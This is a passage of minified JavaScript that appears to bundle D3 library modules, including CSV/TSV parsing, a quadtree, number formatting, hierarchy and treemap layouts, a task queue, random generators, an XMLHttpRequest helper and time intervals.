this[Lr+(t+="")]=t,this},remove:Ur.remove,clear:Ur.clear,values:Ur.keys,size:Ur.size,empty:Ur.empty,each:Ur.each};var Dr={},Or={};function jr(t){return new Function("d","return {"+t.map((function(t,e){return JSON.stringify(t)+": d["+e+"]"})).join(",")+"}")}function zr(t){var e=new RegExp('["'+t+"\n\r]"),n=t.charCodeAt(0);function r(t,e){var r,i=[],o=t.length,a=0,u=0,c=o<=0,s=!1;function h(){if(c)return Or;if(s)return s=!1,Dr;var e,r,i=a;if(34===t.charCodeAt(i)){for(;a++<o&&34!==t.charCodeAt(a)||34===t.charCodeAt(++a););return(e=a)>=o?c=!0:10===(r=t.charCodeAt(a++))?s=!0:13===r&&(s=!0,10===t.charCodeAt(a)&&++a),t.slice(i+1,e-1).replace(/""/g,'"')}for(;a<o;){if(10===(r=t.charCodeAt(e=a++)))s=!0;else if(13===r)s=!0,10===t.charCodeAt(a)&&++a;else if(r!==n)continue;return t.slice(i,e)}return c=!0,t.slice(i,o)}for(10===t.charCodeAt(o-1)&&--o,13===t.charCodeAt(o-1)&&--o;(r=h())!==Or;){for(var f=[];r!==Dr&&r!==Or;)f.push(r),r=h();e&&null==(f=e(f,u++))||i.push(f)}return i}function i(e){return e.map(o).join(t)}function o(t){return null==t?"":e.test(t+="")?'"'+t.replace(/"/g,'""')+'"':t}return{parse:function(t,e){var n,i,o=r(t,(function(t,r){if(n)return n(t,r-1);i=t,n=e?function(t,e){var n=jr(t);return function(r,i){return e(n(r),i,t)}}(t,e):jr(t)}));return o.columns=i||[],o},parseRows:r,format:function(e,n){return null==n&&(n=function(t){var e=Object.create(null),n=[];return t.forEach((function(t){for(var r in t)r in e||n.push(e[r]=r)})),n}(e)),[n.map(o).join(t)].concat(e.map((function(e){return n.map((function(t){return o(e[t])})).join(t)}))).join("\n")},formatRows:function(t){return t.map(i).join("\n")}}}var Pr=zr(","),Ir=Pr.parse,Rr=(Pr.parseRows,Pr.format,Pr.formatRows,zr("\t")),Fr=Rr.parse;function qr(t,e,n,r){if(isNaN(e)||isNaN(n))return t;var i,o,a,u,c,s,h,f,l,d=t._root,p={data:r},y=t._x0,g=t._y0,v=t._x1,m=t._y1;if(!d)return t._root=p,t;for(;d.length;)if((s=e>=(o=(y+v)/2))?y=o:v=o,(h=n>=(a=(g+m)/2))?g=a:m=a,i=d,!(d=d[f=h<<1|s]))return i[f]=p,t;if(u=+t._x.call(null,d.data),c=+t._y.call(null,d.data),e===u&&n===c)return p.next=d,i?i[f]=p:t._root=p,t;do{i=i?i[f]=new Array(4):t._root=new Array(4),(s=e>=(o=(y+v)/2))?y=o:v=o,(h=n>=(a=(g+m)/2))?g=a:m=a}while((f=h<<1|s)==(l=(c>=a)<<1|u>=o));return i[l]=d,i[f]=p,t}function Br(t,e,n,r,i){this.node=t,this.x0=e,this.y0=n,this.x1=r,this.y1=i}function Yr(t){return t[0]}function Wr(t){return t[1]}function Kr(t,e,n){var r=new Hr(null==e?Yr:e,null==n?Wr:n,NaN,NaN,NaN,NaN);return null==t?r:r.addAll(t)}function Hr(t,e,n,r,i,o){this._x=t,this._y=e,this._x0=n,this._y0=r,this._x1=i,this._y1=o,this._root=void 0}function Xr(t){for(var e={data:t.data},n=e;t=t.next;)n=n.next={data:t.data};return e}Rr.parseRows,Rr.format,Rr.formatRows;var $r=Kr.prototype=Hr.prototype;function Vr(t){return function(){return t}}function Zr(){return 1e-6*(Math.random()-.5)}function Jr(t){return t.index}function Qr(t,e){var n=t.get(e);if(!n)throw new Error("missing: "+e);return n}function ti(t){return t.x}function ei(t){return t.y}$r.copy=function(){var t,e,n=new Hr(this._x,this._y,this._x0,this._y0,this._x1,this._y1),r=this._root;if(!r)return n;if(!r.length)return n._root=Xr(r),n;for(t=[{source:r,target:n._root=new Array(4)}];r=t.pop();)for(var i=0;i<4;++i)(e=r.source[i])&&(e.length?t.push({source:e,target:r.target[i]=new Array(4)}):r.target[i]=Xr(e));return n},$r.add=function(t){var e=+this._x.call(null,t),n=+this._y.call(null,t);return qr(this.cover(e,n),e,n,t)},$r.addAll=function(t){var e,n,r,i,o=t.length,a=new Array(o),u=new Array(o),c=1/0,s=1/0,h=-1/0,f=-1/0;for(n=0;n<o;++n)isNaN(r=+this._x.call(null,e=t[n]))||isNaN(i=+this._y.call(null,e))||(a[n]=r,u[n]=i,r<c&&(c=r),r>h&&(h=r),i<s&&(s=i),i>f&&(f=i));for(h<c&&(c=this._x0,h=this._x1),f<s&&(s=this._y0,f=this._y1),this.cover(c,s).cover(h,f),n=0;n<o;++n)qr(this,a[n],u[n],t[n]);return this},$r.cover=function(t,e){if(isNaN(t=+t)||isNaN(e=+e))return this;var n=this._x0,r=this._y0,i=this._x1,o=this._y1;if(isNaN(n))i=(n=Math.floor(t))+1,o=(r=Math.floor(e))+1;else{if(!(n>t||t>i||r>e||e>o))return this;var a,u,c=i-n,s=this._root;switch(u=(e<(r+o)/2)<<1|t<(n+i)/2){case 0:do{(a=new Array(4))[u]=s,s=a}while(o=r+(c*=2),t>(i=n+c)||e>o);break;case 1:do{(a=new Array(4))[u]=s,s=a}while(o=r+(c*=2),(n=i-c)>t||e>o);break;case 2:do{(a=new Array(4))[u]=s,s=a}while(r=o-(c*=2),t>(i=n+c)||r>e);break;case 3:do{(a=new Array(4))[u]=s,s=a}while(r=o-(c*=2),(n=i-c)>t||r>e)}this._root&&this._root.length&&(this._root=s)}return this._x0=n,this._y0=r,this._x1=i,this._y1=o,this},$r.data=function(){var t=[];return this.visit((function(e){if(!e.length)do{t.push(e.data)}while(e=e.next)})),t},$r.extent=function(t){return arguments.length?this.cover(+t[0][0],+t[0][1]).cover(+t[1][0],+t[1][1]):isNaN(this._x0)?void 0:[[this._x0,this._y0],[this._x1,this._y1]]},$r.find=function(t,e,n){var r,i,o,a,u,c,s,h=this._x0,f=this._y0,l=this._x1,d=this._y1,p=[],y=this._root;for(y&&p.push(new Br(y,h,f,l,d)),null==n?n=1/0:(h=t-n,f=e-n,l=t+n,d=e+n,n*=n);c=p.pop();)if(!(!(y=c.node)||(i=c.x0)>l||(o=c.y0)>d||(a=c.x1)<h||(u=c.y1)<f))if(y.length){var g=(i+a)/2,v=(o+u)/2;p.push(new Br(y[3],g,v,a,u),new Br(y[2],i,v,g,u),new Br(y[1],g,o,a,v),new Br(y[0],i,o,g,v)),(s=(e>=v)<<1|t>=g)&&(c=p[p.length-1],p[p.length-1]=p[p.length-1-s],p[p.length-1-s]=c)}else{var m=t-+this._x.call(null,y.data),_=e-+this._y.call(null,y.data),b=m*m+_*_;if(b<n){var w=Math.sqrt(n=b);h=t-w,f=e-w,l=t+w,d=e+w,r=y.data}}return r},$r.remove=function(t){if(isNaN(o=+this._x.call(null,t))||isNaN(a=+this._y.call(null,t)))return this;var e,n,r,i,o,a,u,c,s,h,f,l,d=this._root,p=this._x0,y=this._y0,g=this._x1,v=this._y1;if(!d)return this;if(d.length)for(;;){if((s=o>=(u=(p+g)/2))?p=u:g=u,(h=a>=(c=(y+v)/2))?y=c:v=c,e=d,!(d=d[f=h<<1|s]))return this;if(!d.length)break;(e[f+1&3]||e[f+2&3]||e[f+3&3])&&(n=e,l=f)}for(;d.data!==t;)if(r=d,!(d=d.next))return this;return(i=d.next)&&delete d.next,r?(i?r.next=i:delete r.next,this):e?(i?e[f]=i:delete e[f],(d=e[0]||e[1]||e[2]||e[3])&&d===(e[3]||e[2]||e[1]||e[0])&&!d.length&&(n?n[l]=d:this._root=d),this):(this._root=i,this)},$r.removeAll=function(t){for(var e=0,n=t.length;e<n;++e)this.remove(t[e]);return this},$r.root=function(){return this._root},$r.size=function(){var t=0;return this.visit((function(e){if(!e.length)do{++t}while(e=e.next)})),t},$r.visit=function(t){var e,n,r,i,o,a,u=[],c=this._root;for(c&&u.push(new Br(c,this._x0,this._y0,this._x1,this._y1));e=u.pop();)if(!t(c=e.node,r=e.x0,i=e.y0,o=e.x1,a=e.y1)&&c.length){var s=(r+o)/2,h=(i+a)/2;(n=c[3])&&u.push(new Br(n,s,h,o,a)),(n=c[2])&&u.push(new Br(n,r,h,s,a)),(n=c[1])&&u.push(new Br(n,s,i,o,h)),(n=c[0])&&u.push(new Br(n,r,i,s,h))}return this},$r.visitAfter=function(t){var e,n=[],r=[];for(this._root&&n.push(new Br(this._root,this._x0,this._y0,this._x1,this._y1));e=n.pop();){var i=e.node;if(i.length){var o,a=e.x0,u=e.y0,c=e.x1,s=e.y1,h=(a+c)/2,f=(u+s)/2;(o=i[0])&&n.push(new Br(o,a,u,h,f)),(o=i[1])&&n.push(new Br(o,h,u,c,f)),(o=i[2])&&n.push(new Br(o,a,f,h,s)),(o=i[3])&&n.push(new Br(o,h,f,c,s))}r.push(e)}for(;e=r.pop();)t(e.node,e.x0,e.y0,e.x1,e.y1);return this},$r.x=function(t){return arguments.length?(this._x=t,this):this._x},$r.y=function(t){return arguments.length?(this._y=t,this):this._y};var ni,ri=Math.PI*(3-Math.sqrt(5));function ii(t,e){if((n=(t=e?t.toExponential(e-1):t.toExponential()).indexOf("e"))<0)return null;var n,r=t.slice(0,n);return[r.length>1?r[0]+r.slice(2):r,+t.slice(n+1)]}function oi(t,e){var n=ii(t,e);if(!n)return t+"";var r=n[0],i=n[1];return i<0?"0."+new Array(-i).join("0")+r:r.length>i+1?r.slice(0,i+1)+"."+r.slice(i+1):r+new Array(i-r.length+2).join("0")}const ai={"":function(t,e){t:for(var n,r=(t=t.toPrecision(e)).length,i=1,o=-1;i<r;++i)switch(t[i]){case".":o=n=i;break;case"0":0===o&&(o=i),n=i;break;case"e":break t;default:o>0&&(o=0)}return o>0?t.slice(0,o)+t.slice(n+1):t},"%":function(t,e){return(100*t).toFixed(e)},b:function(t){return Math.round(t).toString(2)},c:function(t){return t+""},d:function(t){return Math.round(t).toString(10)},e:function(t,e){return t.toExponential(e)},f:function(t,e){return t.toFixed(e)},g:function(t,e){return t.toPrecision(e)},o:function(t){return Math.round(t).toString(8)},p:function(t,e){return oi(100*t,e)},r:oi,s:function(t,e){var n=ii(t,e);if(!n)return t+"";var r=n[0],i=n[1],o=i-(ni=3*Math.max(-8,Math.min(8,Math.floor(i/3))))+1,a=r.length;return o===a?r:o>a?r+new Array(o-a+1).join("0"):o>0?r.slice(0,o)+"."+r.slice(o):"0."+new Array(1-o).join("0")+ii(t,Math.max(0,e+o-1))[0]},X:function(t){return Math.round(t).toString(16).toUpperCase()},x:function(t){return Math.round(t).toString(16)}};var ui=/^(?:(.)?([<>=^]))?([+\-\( ])?([$#])?(0)?(\d+)?(,)?(\.\d+)?([a-z%])?$/i;function ci(t){return new si(t)}function si(t){if(!(e=ui.exec(t)))throw new Error("invalid format: "+t);var e,n=e[1]||" ",r=e[2]||">",i=e[3]||"-",o=e[4]||"",a=!!e[5],u=e[6]&&+e[6],c=!!e[7],s=e[8]&&+e[8].slice(1),h=e[9]||"";"n"===h?(c=!0,h="g"):ai[h]||(h=""),(a||"0"===n&&"="===r)&&(a=!0,n="0",r="="),this.fill=n,this.align=r,this.sign=i,this.symbol=o,this.zero=a,this.width=u,this.comma=c,this.precision=s,this.type=h}function hi(t){return t}ci.prototype=si.prototype,si.prototype.toString=function(){return this.fill+this.align+this.sign+this.symbol+(this.zero?"0":"")+(null==this.width?"":Math.max(1,0|this.width))+(this.comma?",":"")+(null==this.precision?"":"."+Math.max(0,0|this.precision))+this.type};var fi,li=["y","z","a","f","p","n","µ","m","","k","M","G","T","P","E","Z","Y"];function di(){return new pi}function pi(){this.reset()}fi=function(t){var e,n,r=t.grouping&&t.thousands?(e=t.grouping,n=t.thousands,function(t,r){for(var i=t.length,o=[],a=0,u=e[0],c=0;i>0&&u>0&&(c+u+1>r&&(u=Math.max(1,r-c)),o.push(t.substring(i-=u,i+u)),!((c+=u+1)>r));)u=e[a=(a+1)%e.length];return o.reverse().join(n)}):hi,i=t.currency,o=t.decimal,a=t.numerals?function(t){return function(e){return e.replace(/[0-9]/g,(function(e){return t[+e]}))}}(t.numerals):hi,u=t.percent||"%";function c(t){var e=(t=ci(t)).fill,n=t.align,c=t.sign,s=t.symbol,h=t.zero,f=t.width,l=t.comma,d=t.precision,p=t.type,y="$"===s?i[0]:"#"===s&&/[boxX]/.test(p)?"0"+p.toLowerCase():"",g="$"===s?i[1]:/[%p]/.test(p)?u:"",v=ai[p],m=!p||/[defgprs%]/.test(p);function _(t){var i,u,s,_=y,b=g;if("c"===p)b=v(t)+b,t="";else{var w=(t=+t)<0;if(t=v(Math.abs(t),d),w&&0==+t&&(w=!1),_=(w?"("===c?c:"-":"-"===c||"("===c?"":c)+_,b=("s"===p?li[8+ni/3]:"")+b+(w&&"("===c?")":""),m)for(i=-1,u=t.length;++i<u;)if(48>(s=t.charCodeAt(i))||s>57){b=(46===s?o+t.slice(i+1):t.slice(i))+b,t=t.slice(0,i);break}}l&&!h&&(t=r(t,1/0));var x=_.length+t.length+b.length,k=x<f?new Array(f-x+1).join(e):"";switch(l&&h&&(t=r(k+t,k.length?f-b.length:1/0),k=""),n){case"<":t=_+t+b+k;break;case"=":t=_+k+t+b;break;case"^":t=k.slice(0,x=k.length>>1)+_+t+b+k.slice(x);break;default:t=k+_+t+b}return a(t)}return d=null==d?p?6:12:/[gprs]/.test(p)?Math.max(1,Math.min(21,d)):Math.max(0,Math.min(20,d)),_.toString=function(){return t+""},_}return{format:c,formatPrefix:function(t,e){var n,r=c(((t=ci(t)).type="f",t)),i=3*Math.max(-8,Math.min(8,Math.floor((n=e,((n=ii(Math.abs(n)))?n[1]:NaN)/3)))),o=Math.pow(10,-i),a=li[8+i/3];return function(t){return r(o*t)+a}}}}({decimal:".",thousands:",",grouping:[3],currency:["$",""]}),fi.format,fi.formatPrefix,pi.prototype={constructor:pi,reset:function(){this.s=this.t=0},add:function(t){gi(yi,t,this.t),gi(this,yi.s,this.s),this.s?this.t+=yi.t:this.s=yi.t},valueOf:function(){return this.s}};var yi=new pi;function gi(t,e,n){var r=t.s=e+n,i=r-e,o=r-i;t.t=e-o+(n-i)}var vi=Math.PI,mi=vi/2,_i=2*vi,bi=vi/180,wi=(Math.abs,Math.atan),xi=Math.atan2,ki=Math.cos,Mi=(Math.ceil,Math.exp,Math.floor,Math.log,Math.pow,Math.sin),Ei=(Math.sign,Math.sqrt);Math.tan;function Ai(t){return t>1?mi:t<-1?-mi:Math.asin(t)}function Si(t,e){return[t>vi?t-_i:t<-vi?t+_i:t,e]}di(),di(),di(),Si.invert=Si;di();function Li(t,e){return t<e?-1:t>e?1:t>=e?0:NaN}var Ni=function(t){return 1===t.length&&(t=function(t){return function(e,n){return Li(t(e),n)}}(t)),{left:function(e,n,r,i){for(null==r&&(r=0),null==i&&(i=e.length);r<i;){var o=r+i>>>1;t(e[o],n)<0?r=o+1:i=o}return r},right:function(e,n,r,i){for(null==r&&(r=0),null==i&&(i=e.length);r<i;){var o=r+i>>>1;t(e[o],n)>0?i=o:r=o+1}return r}}}(Li);Ni.right,Ni.left;var Ci=Array.prototype;function Ti(){}function Gi(t){return function(e,n){var r=ki(e),i=ki(n),o=t(r*i);return[o*i*Mi(e),o*Mi(n)]}}function Ui(t){return function(e,n){var r=Ei(e*e+n*n),i=t(r),o=Mi(i),a=ki(i);return[xi(e*o,r*a),Ai(r&&n*o/r)]}}function Di(t,e){return[t,e]}function Oi(t){var e=0,n=t.children,r=n&&n.length;if(r)for(;--r>=0;)e+=n[r].value;else e=1;t.value=e}function ji(t,e){var n,r,i,o,a,u=new Ri(t),c=+t.value&&(u.value=t.value),s=[u];for(null==e&&(e=zi);n=s.pop();)if(c&&(n.value=+n.data.value),(i=e(n.data))&&(a=i.length))for(n.children=new Array(a),o=a-1;o>=0;--o)s.push(r=n.children[o]=new Ri(i[o])),r.parent=n,r.depth=n.depth+1;return u.eachBefore(Ii)}function zi(t){return t.children}function Pi(t){t.data=t.data.data}function Ii(t){var e=0;do{t.height=e}while((t=t.parent)&&t.height<++e)}function Ri(t){this.data=t,this.depth=this.height=0,this.parent=null}function Fi(t,e,n,r,i){for(var o,a=t.children,u=-1,c=a.length,s=t.value&&(r-e)/t.value;++u<c;)(o=a[u]).y0=n,o.y1=i,o.x0=e,o.x1=e+=o.value*s}function qi(t,e,n,r,i){for(var o,a=t.children,u=-1,c=a.length,s=t.value&&(i-n)/t.value;++u<c;)(o=a[u]).x0=e,o.x1=r,o.y0=n,o.y1=n+=o.value*s}Ci.slice,Ci.map,Math.sqrt(50),Math.sqrt(10),Math.sqrt(2),di(),di(),di(),di(),Ti.prototype={constructor:Ti,point:function(t,e){this.stream.point(t,e)},sphere:function(){this.stream.sphere()},lineStart:function(){this.stream.lineStart()},lineEnd:function(){this.stream.lineEnd()},polygonStart:function(){this.stream.polygonStart()},polygonEnd:function(){this.stream.polygonEnd()}},ki(30*bi),Gi((function(t){return Ei(2/(1+t))})).invert=Ui((function(t){return 2*Ai(t/2)})),Gi((function(t){return(t=(e=t)>1?0:e<-1?vi:Math.acos(e))&&t/Mi(t);var e})).invert=Ui((function(t){return t})),Di.invert=Di,Ui(wi),Ui(Ai),Ui((function(t){return 2*wi(t)})),Ri.prototype=ji.prototype={constructor:Ri,count:function(){return this.eachAfter(Oi)},each:function(t){var e,n,r,i,o=this,a=[o];do{for(e=a.reverse(),a=[];o=e.pop();)if(t(o),n=o.children)for(r=0,i=n.length;r<i;++r)a.push(n[r])}while(a.length);return this},eachAfter:function(t){for(var e,n,r,i=this,o=[i],a=[];i=o.pop();)if(a.push(i),e=i.children)for(n=0,r=e.length;n<r;++n)o.push(e[n]);for(;i=a.pop();)t(i);return this},eachBefore:function(t){for(var e,n,r=this,i=[r];r=i.pop();)if(t(r),e=r.children)for(n=e.length-1;n>=0;--n)i.push(e[n]);return this},sum:function(t){return this.eachAfter((function(e){for(var n=+t(e.data)||0,r=e.children,i=r&&r.length;--i>=0;)n+=r[i].value;e.value=n}))},sort:function(t){return this.eachBefore((function(e){e.children&&e.children.sort(t)}))},path:function(t){for(var e=this,n=function(t,e){if(t===e)return t;var n=t.ancestors(),r=e.ancestors(),i=null;for(t=n.pop(),e=r.pop();t===e;)i=t,t=n.pop(),e=r.pop();return i}(e,t),r=[e];e!==n;)e=e.parent,r.push(e);for(var i=r.length;t!==n;)r.splice(i,0,t),t=t.parent;return r},ancestors:function(){for(var t=this,e=[t];t=t.parent;)e.push(t);return e},descendants:function(){var t=[];return this.each((function(e){t.push(e)})),t},leaves:function(){var t=[];return this.eachBefore((function(e){e.children||t.push(e)})),t},links:function(){var t=this,e=[];return t.each((function(n){n!==t&&e.push({source:n.parent,target:n})})),e},copy:function(){return ji(this).eachBefore(Pi)}},Array.prototype.slice,Object.create(Ri.prototype);var Bi=(1+Math.sqrt(5))/2;function Yi(t,e,n,r,i,o){for(var a,u,c,s,h,f,l,d,p,y,g,v=[],m=e.children,_=0,b=0,w=m.length,x=e.value;_<w;){c=i-n,s=o-r;do{h=m[b++].value}while(!h&&b<w);for(f=l=h,g=h*h*(y=Math.max(s/c,c/s)/(x*t)),p=Math.max(l/g,g/f);b<w;++b){if(h+=u=m[b].value,u<f&&(f=u),u>l&&(l=u),g=h*h*y,(d=Math.max(l/g,g/f))>p){h-=u;break}p=d}v.push(a={value:h,dice:c<s,children:m.slice(_,b)}),a.dice?Fi(a,n,r,i,x?r+=s*h/x:o):qi(a,n,r,x?n+=c*h/x:i,o),x-=h,_=b}return v}!function t(e){function n(t,n,r,i,o){Yi(e,t,n,r,i,o)}return n.ratio=function(e){return t((e=+e)>1?e:1)},n}(Bi),function t(e){function n(t,n,r,i,o){if((a=t._squarify)&&a.ratio===e)for(var a,u,c,s,h,f=-1,l=a.length,d=t.value;++f<l;){for(c=(u=a[f]).children,s=u.value=0,h=c.length;s<h;++s)u.value+=c[s].value;u.dice?Fi(u,n,r,i,r+=(o-r)*u.value/d):qi(u,n,r,n+=(i-n)*u.value/d,o),d-=u.value}else t._squarify=a=Yi(e,t,n,r,i,o),a.ratio=e}return n.ratio=function(e){return t((e=+e)>1?e:1)},n}(Bi);var Wi=[].slice,Ki={};function Hi(t){this._size=t,this._call=this._error=null,this._tasks=[],this._data=[],this._waiting=this._active=this._ended=this._start=0}function Xi(t){if(!t._start)try{!function(t){for(;t._start=t._waiting&&t._active<t._size;){var e=t._ended+t._active,n=t._tasks[e],r=n.length-1,i=n[r];n[r]=$i(t,e),--t._waiting,++t._active,n=i.apply(null,n),t._tasks[e]&&(t._tasks[e]=n||Ki)}}(t)}catch(e){if(t._tasks[t._ended+t._active-1])Vi(t,e);else if(!t._data)throw e}}function $i(t,e){return function(n,r){t._tasks[e]&&(--t._active,++t._ended,t._tasks[e]=null,null==t._error&&(null!=n?Vi(t,n):(t._data[e]=r,t._waiting?Xi(t):Zi(t))))}}function Vi(t,e){var n,r=t._tasks.length;for(t._error=e,t._data=void 0,t._waiting=NaN;--r>=0;)if((n=t._tasks[r])&&(t._tasks[r]=null,n.abort))try{n.abort()}catch(e){}t._active=NaN,Zi(t)}function Zi(t){if(!t._active&&t._call){var e=t._data;t._data=void 0,t._call(t._error,e)}}function Ji(){return Math.random()}Hi.prototype=function(t){if(null==t)t=1/0;else if(!((t=+t)>=1))throw new Error("invalid concurrency");return new Hi(t)}.prototype={constructor:Hi,defer:function(t){if("function"!=typeof t)throw new Error("invalid callback");if(this._call)throw new Error("defer after await");if(null!=this._error)return this;var e=Wi.call(arguments,1);return e.push(t),++this._waiting,this._tasks.push(e),Xi(this),this},abort:function(){return null==this._error&&Vi(this,new Error("abort")),this},await:function(t){if("function"!=typeof t)throw new Error("invalid callback");if(this._call)throw new Error("multiple await");return this._call=function(e,n){t.apply(null,[e].concat(n))},Zi(this),this},awaitAll:function(t){if("function"!=typeof t)throw new Error("invalid callback");if(this._call)throw new Error("multiple await");return this._call=t,Zi(this),this}},function t(e){function n(t,n){return t=null==t?0:+t,n=null==n?1:+n,1===arguments.length?(n=t,t=0):n-=t,function(){return e()*n+t}}return n.source=t,n}(Ji);const Qi=function t(e){function n(t,n){var r,i;return t=null==t?0:+t,n=null==n?1:+n,function(){var o;if(null!=r)o=r,r=null;else do{r=2*e()-1,o=2*e()-1,i=r*r+o*o}while(!i||i>1);return t+n*o*Math.sqrt(-2*Math.log(i)/i)}}return n.source=t,n}(Ji),to=(function t(e){function n(){var t=Qi.source(e).apply(this,arguments);return function(){return Math.exp(t())}}return n.source=t,n}(Ji),function t(e){function n(t){return function(){for(var n=0,r=0;r<t;++r)n+=e();return n}}return n.source=t,n}(Ji));function eo(t,e){var n,r,i,o,a=p("beforesend","progress","load","error"),u=Tr(),c=new XMLHttpRequest,s=null,h=null,f=0;function l(t){var e,r=c.status;if(!r&&function(t){var e=t.responseType;return e&&"text"!==e?t.response:t.responseText}(c)||r>=200&&r<300||304===r){if(i)try{e=i.call(n,c)}catch(t){return void a.call("error",n,t)}else e=c;a.call("load",n,e)}else a.call("error",n,t)}if("undefined"!=typeof XDomainRequest&&!("withCredentials"in c)&&/^(http(s)?:)?\/\//.test(t)&&(c=new XDomainRequest),"onload"in c?c.onload=c.onerror=c.ontimeout=l:c.onreadystatechange=function(t){c.readyState>3&&l(t)},c.onprogress=function(t){a.call("progress",n,t)},n={header:function(t,e){return t=(t+"").toLowerCase(),arguments.length<2?u.get(t):(null==e?u.remove(t):u.set(t,e+""),n)},mimeType:function(t){return arguments.length?(r=null==t?null:t+"",n):r},responseType:function(t){return arguments.length?(o=t,n):o},timeout:function(t){return arguments.length?(f=+t,n):f},user:function(t){return arguments.length<1?s:(s=null==t?null:t+"",n)},password:function(t){return arguments.length<1?h:(h=null==t?null:t+"",n)},response:function(t){return i=t,n},get:function(t,e){return n.send("GET",t,e)},post:function(t,e){return n.send("POST",t,e)},send:function(e,i,l){return c.open(e,t,!0,s,h),null==r||u.has("accept")||u.set("accept",r+",*/*"),c.setRequestHeader&&u.each((function(t,e){c.setRequestHeader(e,t)})),null!=r&&c.overrideMimeType&&c.overrideMimeType(r),null!=o&&(c.responseType=o),f>0&&(c.timeout=f),null==l&&"function"==typeof i&&(l=i,i=null),null!=l&&1===l.length&&(l=function(t){return function(e,n){t(null==e?n:null)}}(l)),null!=l&&n.on("error",l).on("load",(function(t){l(null,t)})),a.call("beforesend",n,c),c.send(null==i?null:i),n},abort:function(){return c.abort(),n},on:function(){var t=a.on.apply(a,arguments);return t===a?n:t}},null!=e){if("function"!=typeof e)throw new Error("invalid callback: "+e);return n.get(e)}return n}function no(t,e){return function(n,r){var i=eo(n).mimeType(t).response(e);if(null!=r){if("function"!=typeof r)throw new Error("invalid callback: "+r);return i.get(r)}return i}}function ro(t,e){return function(n,r,i){arguments.length<3&&(i=r,r=null);var o=eo(n).mimeType(t);return o.row=function(t){return arguments.length?o.response(function(t,e){return function(n){return t(n.responseText,e)}}(e,r=t)):r},o.row(r),i?o.get(i):o}}(function t(e){function n(t){var n=to.source(e)(t);return function(){return n()/t}}return n.source=t,n})(Ji),function t(e){function n(t){return function(){return-Math.log(1-e())/t}}return n.source=t,n}(Ji),no("text/html",(function(t){return document.createRange().createContextualFragment(t.responseText)})),no("application/json",(function(t){return JSON.parse(t.responseText)})),no("text/plain",(function(t){return t.responseText})),no("application/xml",(function(t){var e=t.responseXML;if(!e)throw new Error("parse error");return e})),ro("text/csv",Ir),ro("text/tab-separated-values",Fr);var io=Array.prototype;io.map,io.slice;var oo=new Date,ao=new Date;function uo(t,e,n,r){function i(e){return t(e=new Date(+e)),e}return i.floor=i,i.ceil=function(n){return t(n=new Date(n-1)),e(n,1),t(n),n},i.round=function(t){var e=i(t),n=i.ceil(t);return t-e<n-t?e:n},i.offset=function(t,n){return e(t=new Date(+t),null==n?1:Math.floor(n)),t},i.range=function(n,r,o){var a,u=[];if(n=i.ceil(n),o=null==o?1:Math.floor(o),!(n<r&&o>0))return u;do{u.push(a=new Date(+n)),e(n,o),t(n)}while(a<n&&n<r);return u},i.filter=function(n){return uo((function(e){if(e>=e)for(;t(e),!n(e);)e.setTime(e-1)}),(function(t,r){if(t>=t)if(r<0)for(;++r<=0;)for(;e(t,-1),!n(t););else for(;--r>=0;)for(;e(t,1),!n(t););}))},n&&(i.count=function(e,r){return oo.setTime(+e),ao.setTime(+r),t(oo),t(ao),Math.floor(n(oo,ao))},i.every=function(t){return t=Math.floor(t),isFinite(t)&&t>0?t>1?i.filter(r?function(e){return r(e)%t==0}:function(e){return i.count(0,e)%t==0}):i:null}),i}var co=uo((function(){}),(function(t,e){t.setTime(+t+e)}),(function(t,e){return e-t}));co.every=function(t){return t=Math.floor(t),isFinite(t)&&t>0?t>1?uo((function(e){e.setTime(Math.floor(e/t)*t)}),(function(e,n){e.setTime(+e+n*t)}),(function(e,n){return(n-e)/t})):co:null},co.range;var so=1e3,ho=6e4,fo=36e5,lo=864e5,po=6048e5,yo=uo((function(t){t.setTime(Math.floor(t/so)*so)}),(function(t,e){t.setTime(+t+e*so)}),(function(t,e){return(e-t)/so}),(function(t){return t.getUTCSeconds()}));yo.range;var go=uo((function(t){t.setTime(Math.floor(t/ho)*ho)}),(function(t,e){t.setTime(+t+e*ho)}),(function(t,e){return(e-t)/ho}),(function(t){return t.getMinutes()}));go.range;var vo=uo((function(t){var e=t.getTimezoneOffset()*ho%fo;e<0&&(e+=fo),t.setTime(Math.floor((+t-e)/fo)*fo+e)}),(function(t,e){t.setTime(+t+e*fo)}),(function(t,e){return(e-t)/fo}),(function(t){return t.getHours()}));vo.range;var mo=uo((function(t){t.setHours(0,0,0,0)}),(function(t,e){t.setDate(t.getDate()+e)}),(function(t,e){return(e-t-(e.getTimezoneOffset()-t.getTimezoneOffset())*ho)/lo}),(function(t){return t.getDate()-1}));const _o=mo;function bo(t){return uo((function(e){e.setDate(e.getDate()-(e.getDay()+7-t)%7),e.setHours(0,0,0,0)}),(function(t,e){t.setDate(t.getDate()+7*e)}),(function(t,e){return(e-t-(e.getTimezoneOffset()-t.getTimezoneOffset())*ho)/po}))}mo.range;var wo=bo(0),xo=bo(1),ko=bo(2),Mo=bo(3),Eo=bo(4),Ao=bo(5),So=bo(6),Lo=(wo.range,xo.range,ko.range,Mo.range,Eo.range,Ao.range,So.range,uo((function(t){t.setDate(1),t.setHours(0,0,0,0)}),(function(t,e){t.setMonth(t.getMonth()+e)}),(function(t,e){return e.getMonth()-t.getMonth()+12*(e.getFullYear()-t.getFullYear())}),(function(t){return t.getMonth()})));Lo.range;var No=uo((function(t){t.setMonth(0,1),t.setHours(0,0,0,0)}),(function(t,e){t.setFullYear(t.getFullYear()+e)}),(function(t,e){return e.getFullYear()-t.getFullYear()}),(function(t){return t.getFullYear()}));No.every=function(t){return isFinite(t=Math.floor(t))&&t>0?uo((function(e){e.setFullYear(Math.floor(e.getFullYear()/t)*t),e.setMonth(0,1),e.setHours(0,0,0,0)}),(function(e,n){e.setFullYear(e.getFullYear()+n*t)})):null};const Co=No;No.range;var To=uo((function(t){t.setUTCSeconds(0,0)}),(function(t,e){t.setTime(+t+e*ho)}),(function(t,e){return(e-t)/ho}),(function(t){return t.getUTCMinutes()}));To.range;var Go=uo((function(t){t.setUTCMinutes(0,0,0)}),(function(t,e){t.setTime(+t+e*fo)}),(function(t,e){return(e-t)/fo}),(function(t){return t.getUTCHours()}));Go.range;var Uo=uo((function(t){t.setUTCHours(0,0,0,0)}),(function(t,e){t.setUTCDate(t.getUTCDate()+e)}),(function(t,e){return(e-t)/lo}),(function(t){return t.getUTCDate()-1}));const Do=Uo;function Oo(t){return uo((function(e){e.setUTCDate(e.getUTCDate()-(e.getUTCDay()+7-t)%7),e.setUTCHours(0,0,0,0)}),(function(t,e){t.setUTCDate(t.getUTCDate()+7*e)}),(function(t,e){return(e-t)/po}))}Uo.range;var 